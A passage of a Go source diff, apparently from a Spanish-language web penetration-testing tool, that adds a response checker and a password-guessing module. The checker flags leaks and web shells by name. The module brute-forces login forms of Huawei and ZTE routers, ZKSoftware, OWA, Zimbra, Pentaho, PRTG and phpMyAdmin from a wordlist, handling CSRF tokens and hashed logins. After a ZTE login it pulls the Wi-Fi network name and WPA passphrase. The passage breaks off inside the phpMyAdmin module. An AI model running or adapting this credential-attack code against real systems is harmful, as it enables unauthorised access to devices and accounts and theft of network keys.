@@ -1,10 +1,13 @@
 package webhacks
 
 import (
+	"crypto/md5"
+	"encoding/hex"
 	"crypto/tls"
 	"compress/gzip"
 	"bufio"
 	"math/rand"
+	"strconv"
 	"unicode"
 	"fmt"
 	"net/http"
@@ -17,6 +20,7 @@ import (
 	"io/ioutil"
 	"strings"
 	"net/http/cookiejar"
+	"github.com/fatih/color"
 )
 
 type WebHacks struct {
@@ -50,10 +54,10 @@ func NewWebHacks(timeoutInSeconds, MaxRedirect int) *WebHacks {
 
 	// Select a User-Agent randomly.
 	selectedUserAgent := userAgents[rand.Intn(len(userAgents))]
-	//proxyURL, _ := url.Parse("http://127.0.0.1:8081") // burpsuite
+	proxyURL, _ := url.Parse("http://127.0.0.1:8081") // burpsuite
 	// Create a custom HTTP transport that ignores SSL certificate errors
 	httpTransport := &http.Transport{
-		//Proxy: http.ProxyURL(proxyURL), //burpsuite
+		Proxy: http.ProxyURL(proxyURL), //burpsuite
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
 			MinVersion:         tls.VersionTLS10,
@@ -98,6 +102,1084 @@ func NewWebHacks(timeoutInSeconds, MaxRedirect int) *WebHacks {
 	return wh
 }
 
+
+func ObtenerHashMD5(cadena string) string {
+	hash := md5.Sum([]byte(cadena))
+	return hex.EncodeToString(hash[:])
+}
+
+
+
+// convertHash takes a map and converts it to a URL-encoded query string
+func ConvertHash(hashData map[string]string) string {
+	var postData strings.Builder
+
+	for key, value := range hashData {
+		postData.WriteString(url.QueryEscape(key))
+		postData.WriteString("=")
+		postData.WriteString(url.QueryEscape(value))
+		postData.WriteString("&")
+	}
+
+	// Convert the Builder to a string and remove the trailing '&' character if necessary
+	result := postData.String()
+	if len(result) > 0 {
+		result = result[:len(result)-1]
+	}
+
+	return result
+}
+
+
+func (wh *WebHacks) Dispatch(urlLine string, method string, postData string, headers http.Header) (*http.Response, error) {
+	// Prepare the request
+	var req *http.Request
+	var err error
+
+	if method == "POST" {
+		req, err = http.NewRequest(method, urlLine, strings.NewReader(postData))
+		if err != nil {
+			return nil, err
+		}
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	} else {
+		req, err = http.NewRequest(method, urlLine, nil)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	// Add headers
+	for key, values := range headers {
+		for _, value := range values {
+			req.Header.Add(key, value)
+		}
+	}
+
+	// Send the request
+	resp, err := wh.Client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+
+	return resp, nil
+}
+	
+
+// getRedirect extracts a redirect URL from the decoded HTML response.
+func getRedirect(decodedResponse string) string {
+	// Define patterns to search for redirect URLs
+	patterns := []string{
+		`meta http-equiv=["']Refresh["'] content=["']0; ?URL= ?(.*?)["']`,
+		`meta http-equiv=["']refresh["'] content=["']0; ?URL= ?(.*?)["']`,
+		`meta http-equiv=["']Refresh["'] content=["']1; ?URL= ?(.*?)["']`,
+		`meta http-equiv=["']refresh["'] content=["']1; ?URL= ?(.*?)["']`,
+		`window.onload=function\(\) urlLine ="(.*?)"`,
+		`window.location="(.*?)"`,
+		`location.href="(.*?)"`,
+		`window.location.href = "(.*?)"`,
+		`window.location = "(.*?)"`,
+		`top.location="(.*?)"`,
+		`location.replace\("(.*?)"`,
+		`jumpUrl = "(.*?)"`,
+		`top.document.location.href = "(.*?)"`,
+		`http-equiv="refresh" content="0.1;urlLine=(.*?)"`,
+		`parent.location="(.*?)"`,
+		`redirect_suffix = "(.*?)"`,
+	}
+
+	// Iterate over patterns to find a match
+	for _, pattern := range patterns {
+		re := regexp.MustCompile(pattern)
+		matches := re.FindStringSubmatch(decodedResponse)
+		if len(matches) > 1 {
+			redirectURL := matches[1]
+			// Check if the redirect URL is incomplete, if so, ignore it
+			if redirectURL == "https:" || redirectURL == "http:" {
+				continue
+			}
+			// Check for specific conditions to ignore the redirect URL
+			if re.MatchString(`webfig|\.\.\//`) {
+				// Detected patterns that should be ignored
+				continue
+			}
+			// Remove double quotes from the redirect URL
+			redirectURL = regexp.MustCompile(`"`).ReplaceAllString(redirectURL, "")
+
+			if redirectURL == "login.html" || redirectURL == "../" || redirectURL == "/" || redirectURL == "/public/launchSidebar.jsp" || redirectURL == "/webfig/" || strings.Contains(redirectURL, "Valida") || strings.Contains(redirectURL, "error") || strings.Contains(redirectURL, "microsoftonline")  {
+				redirectURL = ""
+			}
+			return redirectURL
+		}
+	}
+
+	// Return empty string if no redirect URL is found
+	return ""
+}
+
+
+func checkVuln(decodedContent string) string {
+	vuln := ""
+
+	if regexp.MustCompile(`\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.16\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b`).MatchString(decodedContent) {
+		vuln = "IPinterna"
+	}
+	
+
+	if regexp.MustCompile(`(?m)Lorem ipsum`).MatchString(decodedContent) {
+		vuln = "contenidoPrueba"
+	}
+
+	if regexp.MustCompile(`(?i)DEBUG = True|app/controllers|SERVER_ADDR|REMOTE_ADDR|DOCUMENT_ROOT/|TimeoutException|vendor/laravel/framework/src/Illuminate|phpdebugbar`).MatchString(decodedContent) {
+		vuln = "debugHabilitado"
+	}
+
+	if regexp.MustCompile(`(?i) RAT |C99Shell|b374k| r57 | wso | pouya | Kacak | jsp file browser |vonloesch.de|Upload your file|Cannot execute a blank command|fileupload in`).MatchString(decodedContent) {
+		vuln = "backdoor"
+	}
+
+	if regexp.MustCompile(`(?i)db=information_schema`).MatchString(decodedContent) {
+		vuln = "OpenPhpMyAdmin"
+	}
+
+	//fmt.Printf("decodedContent (%s)\n", decodedContent)
+	if regexp.MustCompile(`(?i)var user = "admin";`).MatchString(decodedContent) {
+
+		if !strings.Contains(decodedContent, `INCLUDE_USER_RESTRICTION`) { //negaticvo
+			vuln = "OpenMikrotik"
+		}
+		
+	}
+
+	re := regexp.MustCompile(`(?i)(undefined function|already sent by|Undefined offset|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Exception in thread|Exception information)`)
+	match := re.FindStringSubmatch(decodedContent)
+
+	// Si hay una coincidencia, imprimir el término que coincide
+	if len(match) > 0 {
+		fmt.Println("Término que coincide:", match[1])
+		vuln = "MensajeError"
+	}
+
+	if regexp.MustCompile(`E_WARNING`).MatchString(decodedContent) { //mayuscula
+		vuln = "MensajeError"
+	}
+
+	if regexp.MustCompile(`(?i)(Access denied for|r=usuario/create)`).MatchString(decodedContent) {
+		vuln = "ExposicionUsuarios"
+	}
+	
+
+	if regexp.MustCompile(`(?i)(?:^|[^a-z])(?:index of|directory of|Index of|Parent directory)(?:[^a-z]|$)`).MatchString(decodedContent) {
+		vuln = "ListadoDirectorios"
+	}
+
+	if regexp.MustCompile(`(?i)HTTP_X_FORWARDED_HOST|HTTP_X_FORWARDED_SERVER\(\)`).MatchString(decodedContent) {
+		vuln = "divulgacionInformacion"
+	}
+
+	decodedContentLower := strings.ToLower(decodedContent)
+	
+	pattern := `(?i)"password":|\&password=` //positivo
+	matched, _ := regexp.MatchString(pattern, decodedContent)
+	if matched {
+		if !strings.Contains(decodedContentLower, `"password":$`) && //negativo comilla doble
+			!strings.Contains(decodedContentLower, `password=**`) &&
+			!strings.Contains(decodedContentLower, `password":"password`) &&
+			!strings.Contains(decodedContentLower, `password=" + encodeuricomponent`) &&
+			!strings.Contains(decodedContentLower, `password":"clave`)&&
+			!strings.Contains(decodedContentLower, `password":"http`)&&
+
+			!strings.Contains(decodedContentLower, `password':$`) && //negativo comilla simple
+			!strings.Contains(decodedContentLower, `password':'password`) &&
+			!strings.Contains(decodedContentLower, `password=' + encodeuricomponent`) &&
+			!strings.Contains(decodedContentLower, `password':'clave`) &&
+			!strings.Contains(decodedContentLower, `password':'http`){
+				
+			vuln = "PasswordDetected"
+		}
+	}
+
+	
+	return vuln
+}
+
+func headerToString(header http.Header) string {
+    var headerStr strings.Builder
+
+    for key, values := range header {
+        headerStr.WriteString(key)
+        headerStr.WriteString(": ")
+        headerStr.WriteString(strings.Join(values, ", "))
+        headerStr.WriteString("\n")
+    }
+
+    return headerStr.String()
+}
+
+func (wh *WebHacks) PasswordTest(options map[string]string) {
+	module := options["module"]
+	user := options["user"]
+	password := options["password"]
+	passwordsFile := options["passwords_file"]
+
+	rhost := wh.Rhost
+	rport := wh.Rport
+	proto := wh.Proto
+	debug := wh.Debug
+	path := wh.Path
+	headers := wh.Headers
+
+	if debug {
+		color.Set(color.FgBlue, color.Bold)
+		fmt.Printf("######### Testendo: %s ##################### \n\n", module)
+		color.Unset()
+	}
+
+	
+	var url string
+	if rport == "80" || rport == "443" {
+		url = fmt.Sprintf("%s://%s%s", proto, rhost, path)
+	} else {
+		url = fmt.Sprintf("%s://%s:%s%s", proto, rhost, rport, path)
+	}
+
+	if debug {
+	
+		fmt.Printf("user: %s \n", user)
+		fmt.Printf("password: %s \n", password)
+		fmt.Printf("passwordsFile: %s \n", passwordsFile)
+		fmt.Printf("path: %s \n", path)
+		fmt.Printf("url: %s \n", url)
+	}
+
+	
+
+	passwordsList := []string{}
+	if passwordsFile != "" {
+		file, err := os.Open(passwordsFile)
+		if err != nil {
+			fmt.Printf("ERROR: Cannot open the file %s\n", passwordsFile)
+		}
+		defer file.Close()
+
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() {
+			passwordsList = append(passwordsList, scanner.Text())
+		}
+		if err := scanner.Err(); err != nil {
+			fmt.Printf("ERROR: Reading file %s\n", passwordsFile)
+		}
+	} else {
+		passwordsList = append(passwordsList, password)
+	}
+
+	///////////
+	if module == "HUAWEI-AR" {
+		headers.Set("Origin", url)
+		headers.Set("Referer", url)
+		headers.Set("Upgrade-Insecure-Requests", "1")
+
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+			hashData := map[string]string{
+				"UserName":     user,
+				"Password":     password,
+				"frashnum":     "",
+				"LanguageType": "0",
+			}
+
+			postData := ConvertHash(hashData)
+			resp, err := wh.Dispatch(url, "POST", postData, headers)
+			
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+			}
+
+			status := resp.Status
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if !strings.Contains(string(body), "ErrorMsg") {
+				fmt.Printf("Password encontrado: [HUAWEI-AR] %s Usuario:%s Password:%s \n", url, user, password)
+				break
+			}
+		}
+	} //HUAWI-AR
+
+
+	if module == "ZTE-ONT-4G" {
+		headers.Set("Origin", url)
+		headers.Set("Referer", url)
+		headers.Set("Upgrade-Insecure-Requests", "1")
+
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+
+			resp, err := wh.Dispatch(url, "GET", "", headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+			}
+
+			tokenRegex := regexp.MustCompile(`getObj\("Frm_Logintoken"\).value = "(.*?)"`)
+			matches := tokenRegex.FindStringSubmatch(string(body))
+			if len(matches) < 2 {
+				fmt.Printf("Failed to find Frm_Logintoken in response")
+			}
+			Frm_Logintoken := matches[1]
+
+			hashData := map[string]string{
+				"Username":      user,
+				"Password":      password,
+				"frashnum":      "",
+				"action":        "login",
+				"Frm_Logintoken": Frm_Logintoken,
+			}
+
+			postData := ConvertHash(hashData)
+			resp, err = wh.Dispatch(url, "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			body, err = ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+			}
+
+			status := resp.Status
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if strings.Contains(status, "302") {
+				resp, err = wh.Dispatch(url+"getpage.gch?pid=1002&nextpage=net_wlan_basic_t1.gch", "GET", "", headers)
+				if err != nil {
+					fmt.Printf("Request failed: %v", err)
+				}
+				defer resp.Body.Close()
+
+				body, err = ioutil.ReadAll(resp.Body)
+				if err != nil {
+					fmt.Printf("Failed to read response body: %v", err)
+				}
+
+				decodedResponse := string(body)
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2e", ".")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x20", " ")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x5f", "_")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2d", "-")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x22", "\"")
+
+				keyPassphraseRegex := regexp.MustCompile(`Transfer_meaning\('KeyPassphrase','(\w+)'\);`)
+				keyPassphraseMatches := keyPassphraseRegex.FindStringSubmatch(decodedResponse)
+				var KeyPassphrase string
+				if len(keyPassphraseMatches) >= 2 {
+					KeyPassphrase = keyPassphraseMatches[1]
+				}
+
+				essidRegex := regexp.MustCompile(`Transfer_meaning\('ESSID','(.*?)'\)`)
+				essidMatches := essidRegex.FindAllStringSubmatch(decodedResponse, -1)
+				var ESSID string
+				if len(essidMatches) > 0 {
+					ESSID = essidMatches[len(essidMatches)-1][1]
+				}
+
+				fmt.Printf("Password encontrado: [ZTE ZTE-ONT-4G] %s Usuario:%s Password:%s ESSID %s KeyPassphrase %s \n", url, user, password, ESSID, KeyPassphrase)
+				break
+			}
+		}
+	}//ZTE-ONT-4G
+
+	if module == "ZTE-F6XX-2017" {
+		headers.Set("Referer", url)
+		headers.Set("Upgrade-Insecure-Requests", "1")
+		headers.Set("Cookie", "_TESTCOOKIESUPPORT=1")
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+
+			resp, err := wh.Dispatch(url, "GET", "", headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+			}
+
+			tokenRegex := regexp.MustCompile(`getObj\("Frm_Logintoken"\).value = "(.*?)"`)
+			matches := tokenRegex.FindStringSubmatch(string(body))
+			if len(matches) < 2 {
+				fmt.Printf("Failed to find Frm_Logintoken in response")
+			}
+			Frm_Logintoken := matches[1]
+
+			hashData := map[string]string{
+				"frashnum":      "",
+				"action":        "login",
+				"Frm_Logintoken": Frm_Logintoken,
+				"Username":      user,
+				"Password":      password,
+			}
+
+			postData := ConvertHash(hashData)
+			resp, err = wh.Dispatch(url, "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			body, err = ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+			}
+
+			status := resp.Status
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if strings.Contains(status, "302") {
+				cookieValue := resp.Header.Get("Set-Cookie")
+				if cookieValue != "" {
+					headers.Set("Cookie", fmt.Sprintf("_TESTCOOKIESUPPORT=1; %s", cookieValue))
+				}
+
+				headers.Set("Origin", url)
+
+				resp, err = wh.Dispatch(url+"getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch", "GET", "", headers)
+				if err != nil {
+					fmt.Printf("Request failed: %v", err)
+				}
+				defer resp.Body.Close()
+
+				body, err = ioutil.ReadAll(resp.Body)
+				if err != nil {
+					fmt.Printf("Failed to read response body: %v", err)
+				}
+
+				decodedResponse := string(body)
+				decodedResponse = strings.ReplaceAll(decodedResponse, "Transfer_meaning('ESSID',''", "")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2e", ".")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x20", " ")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x5f", "_")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2d", "-")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x22", "\"")
+
+				essidRegex := regexp.MustCompile(`Transfer_meaning\('ESSID','(.*?)'\)`)
+				essidMatches := essidRegex.FindStringSubmatch(decodedResponse)
+				var ESSID string
+				if len(essidMatches) >= 2 {
+					ESSID = essidMatches[1]
+				}
+
+				resp, err = wh.Dispatch(url+"getpage.gch?pid=1002&nextpage=net_wlanm_secrity1_t.gch", "GET", "", headers)
+				if err != nil {
+					fmt.Printf("Request failed: %v", err)
+				}
+				defer resp.Body.Close()
+
+				body, err = ioutil.ReadAll(resp.Body)
+				if err != nil {
+					fmt.Printf("Failed to read response body: %v", err)
+				}
+
+				decodedResponse = string(body)
+				decodedResponse = strings.ReplaceAll(decodedResponse, "Transfer_meaning('KeyPassphrase',''", "")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2e", ".")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x20", " ")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x5f", "_")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2d", "-")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x22", "\"")
+
+				keyPassphraseRegex := regexp.MustCompile(`Transfer_meaning\('KeyPassphrase','(.*?)'\)`)
+				keyPassphraseMatches := keyPassphraseRegex.FindStringSubmatch(decodedResponse)
+				var KeyPassphrase string
+				if len(keyPassphraseMatches) >= 2 {
+					KeyPassphrase = keyPassphraseMatches[1]
+				}
+
+				fmt.Printf("Password encontrado: [ZTE F6XX] %s Usuario:%s Password:%s ESSID %s KeyPassphrase %s \n", url, user, password, ESSID, KeyPassphrase)
+				break
+			}
+		}
+	}//ZTE-F6XX-2017
+
+
+	if module == "ZTE-F6XX-2018" {
+		headers.Set("Referer", url)
+		headers.Set("Upgrade-Insecure-Requests", "1")
+		headers.Set("Cookie", "_TESTCOOKIESUPPORT=1")
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+
+			resp, err := wh.Dispatch(url, "GET", "", headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+			}
+
+			tokenRegex := regexp.MustCompile(`getObj\("Frm_Logintoken"\).value = "(.*?)"`)
+			matches := tokenRegex.FindStringSubmatch(string(body))
+			if len(matches) < 2 {
+				fmt.Printf("Failed to find Frm_Logintoken in response")
+			}
+			Frm_Logintoken := matches[1]
+
+			randomNumber := rand.Intn(89999999-10000000) + 10000000
+			hashedPassword := ObtenerHashMD5(password + strconv.Itoa(randomNumber))
+
+			hashData := map[string]string{
+				"frashnum":      "",
+				"action":        "login",
+				"Frm_Logintoken": Frm_Logintoken,
+				"UserRandomNum": strconv.Itoa(randomNumber),
+				"Username":      user,
+				"Password":      hashedPassword,
+			}
+
+			postData := ConvertHash(hashData)
+			resp, err = wh.Dispatch(url, "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			body, err = ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+			}
+
+			status := resp.Status
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if strings.Contains(status, "302") {
+				cookieValue := resp.Header.Get("Set-Cookie")
+				if cookieValue != "" {
+					headers.Set("Cookie", fmt.Sprintf("_TESTCOOKIESUPPORT=1; %s", cookieValue))
+				}
+
+				headers.Set("Origin", url)
+
+				resp, err = wh.Dispatch(url+"getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch", "GET", "", headers)
+				if err != nil {
+					fmt.Printf("Request failed: %v", err)
+				}
+				defer resp.Body.Close()
+
+				body, err = ioutil.ReadAll(resp.Body)
+				if err != nil {
+					fmt.Printf("Failed to read response body: %v", err)
+				}
+
+				decodedResponse := string(body)
+				decodedResponse = strings.ReplaceAll(decodedResponse, "Transfer_meaning('ESSID',''", "")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2e", ".")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x20", " ")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x5f", "_")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2d", "-")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x22", "\"")
+
+				essidRegex := regexp.MustCompile(`Transfer_meaning\('ESSID','(.*?)'\)`)
+				essidMatches := essidRegex.FindStringSubmatch(decodedResponse)
+				var ESSID string
+				if len(essidMatches) >= 2 {
+					ESSID = essidMatches[1]
+				}
+
+				resp, err = wh.Dispatch(url+"getpage.gch?pid=1002&nextpage=net_wlanm_secrity1_t.gch", "GET", "", headers)
+				if err != nil {
+					fmt.Printf("Request failed: %v", err)
+				}
+				defer resp.Body.Close()
+
+				body, err = ioutil.ReadAll(resp.Body)
+				if err != nil {
+					fmt.Printf("Failed to read response body: %v", err)
+				}
+
+				decodedResponse = string(body)
+				decodedResponse = strings.ReplaceAll(decodedResponse, "Transfer_meaning('KeyPassphrase',''", "")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2e", ".")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x20", " ")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x5f", "_")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x2d", "-")
+				decodedResponse = strings.ReplaceAll(decodedResponse, "\\x22", "\"")
+
+				keyPassphraseRegex := regexp.MustCompile(`Transfer_meaning\('KeyPassphrase','(.*?)'\)`)
+				keyPassphraseMatches := keyPassphraseRegex.FindStringSubmatch(decodedResponse)
+				var KeyPassphrase string
+				if len(keyPassphraseMatches) >= 2 {
+					KeyPassphrase = keyPassphraseMatches[1]
+				}
+
+				fmt.Printf("Password encontrado: [ZTE F6XX] %s Usuario:%s Password:%s ESSID %s KeyPassphrase %s \n", url, user, password, ESSID, KeyPassphrase)
+				break
+			}
+		}
+	}//ZTE-F6XX-2018
+
+	if module == "ZKSoftware" {
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+			hashData := map[string]string{
+				"username": user,
+				"userpwd":  password,
+			}
+
+			postData := ConvertHash(hashData)
+
+			resp, err := wh.Dispatch(url+"csl/check", "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+			}
+
+			status := resp.Status
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if status == "200 OK" {
+				decodedResponse := string(body)
+				if strings.Contains(strings.ToLower(decodedResponse), "department") ||
+					strings.Contains(strings.ToLower(decodedResponse), "departamento") ||
+					strings.Contains(strings.ToLower(decodedResponse), "frame") ||
+					strings.Contains(strings.ToLower(decodedResponse), "menu") ||
+					strings.Contains(strings.ToLower(decodedResponse), "self.location.href='/") {
+					fmt.Printf("Password encontrado: [ZKSoftware] %s Usuario:%s Password:%s\n", url, user, password)
+					break
+				}
+			}
+		}
+	}//ZKSOFTWARE
+
+	if module == "AMLC" {
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+			hashData := map[string]string{
+				"usu_login":       user,
+				"usu_password":    password,
+				"aj001sr001qwerty": "3730329decdf984212942a59de68a819",
+			}
+
+			postData := ConvertHash(hashData)
+
+			headers.Set("Content-Type", "application/x-www-form-urlencoded")
+			headers.Set("Cookie", "aj001sr001qwertycks=3730329decdf984212942a59de68a819")
+
+			resp, err := wh.Dispatch(url+"login", "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+			}
+			defer resp.Body.Close()
+
+			status := resp.Status
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if status == "303 See Other" {
+				fmt.Printf("Password encontrado: [AMLC] %s Usuario:%s Password:%s\n", url, user, password)
+				break
+			}
+		}
+	}//AMLC
+
+	if module == "owa" {
+		_, err := wh.Dispatch(url , "GET", "", headers)
+		if err != nil {
+			fmt.Printf("Request failed: %v", err)
+		}
+
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+
+			hashData := map[string]string{
+				"destination": url,
+				"passwordText":   "",
+				"isUtf8":"1",
+				"flags": "4",
+				"forcedownlevel": "0",
+				"username": user,
+				"password": password,
+			}
+
+
+			postData := ConvertHash(hashData)
+
+			headers.Set("Sec-Fetch-User", "?1")
+			headers.Set("Origin", url)
+			headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+			resp, err := wh.Dispatch(url + "auth.owa", "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+				continue
+			}
+
+			//status := resp.Status
+			decodedResponse := string(body)
+
+			if strings.Contains(strings.ToLower(decodedResponse), "error en el servicio de red") ||
+				strings.Contains(strings.ToLower(decodedResponse), "network service error") {
+				fmt.Println("El servidor OWA esta bloqueando nuestra IP :(")
+				break
+			}
+
+			lastURL := resp.Request.URL.String()
+			fmt.Printf("[+] user:%s password:%s lastURL:%s\n", user, password, lastURL)
+
+			if !strings.Contains(lastURL, "logon.aspx") {
+				fmt.Printf("Password encontrado: [owa] %s (Usuario:%s Password:%s)\n", url, user, password)
+				break
+			}
+		}
+	}//OWA
+
+	if module == "zimbra" {
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+			resp, err := wh.Dispatch(url, "GET", "", headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+				continue
+			}
+
+			decodedResponse := string(body)
+			loginCSRFRegex := regexp.MustCompile(`name="login_csrf" value="(.*?)"`)
+			matches := loginCSRFRegex.FindStringSubmatch(decodedResponse)
+			if len(matches) < 2 {
+				fmt.Println("Failed to find login_csrf in response")
+				continue
+			}
+			loginCSRF := matches[1]
+
+			hashData := map[string]string{
+				"loginOp":     "login",
+				"client":      "preferred",
+				"login_csrf":  loginCSRF,
+				"username":    user,
+				"password":    password,
+			}
+
+			postData := ConvertHash(hashData)
+
+			headers.Set("Content-Type", "application/x-www-form-urlencoded")
+			headers.Set("Cookie", "ZM_TEST=true; ZM_LOGIN_CSRF="+loginCSRF)
+			headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+
+			resp, err = wh.Dispatch(url, "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			body, err = ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+				continue
+			}
+
+			status := resp.Status
+			decodedResponse = string(body)
+
+			if strings.Contains(strings.ToLower(decodedResponse), "error en el servicio de red") ||
+				strings.Contains(strings.ToLower(decodedResponse), "network service error") {
+				fmt.Println("El servidor Zimbra esta bloqueando nuestra IP :(")
+				break
+			}
+
+			fmt.Printf("[+] user:%s password:%s status:%s \n", user, password, status)
+
+			if status == "302 Found" {
+				fmt.Printf("Password encontrado: [zimbra] %s (Usuario:%s Password:%s)\n", url, user, password)
+				break
+			}
+		}
+	}//zimbra
+
+	if module == "pentaho" {
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+			headers.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+			headers.Set("Accept", "text/plain, */*; q=0.01")
+			headers.Set("X-Requested-With", "XMLHttpRequest")
+
+			hashData := map[string]string{
+				"locale":     "en_US",
+				"j_username": user,
+				"j_password": password,
+			}
+
+			postData := ConvertHash(hashData)
+
+			resp, err := wh.Dispatch(url+"pentaho/j_spring_security_check", "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			status := resp.Status
+			responseHeaders := resp.Header.Get("Location")
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if strings.Contains(strings.ToLower(responseHeaders), "home") {
+				fmt.Printf("Password encontrado: [Pentaho] %s (Usuario:%s Password:%s)\n", url, user, password)
+				break
+			}
+		}
+	}//pentaho
+
+	if module == "PRTG" {
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+			hashData := map[string]string{
+				"username":  user,
+				"password":  password,
+				"guiselect": "radio",
+			}
+
+			postData := ConvertHash(hashData)
+
+			resp, err := wh.Dispatch(url+"/public/checklogin.htm", "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			status := resp.Status
+			responseHeaders := resp.Header.Get("Location")
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if !strings.Contains(strings.ToLower(responseHeaders), "error") && status != "500 read timeout" {
+				fmt.Printf("Password encontrado: [PRTG] %s \nUsuario:%s Password:%s\n", url, user, password)
+				break
+			}
+		}
+	}//PRTG
+
+	if module == "phpmyadmin" {
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+
+			resp, err := wh.Dispatch(url, "GET", "", headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+				continue
+			}
+
+			decodedResponse := string(body)
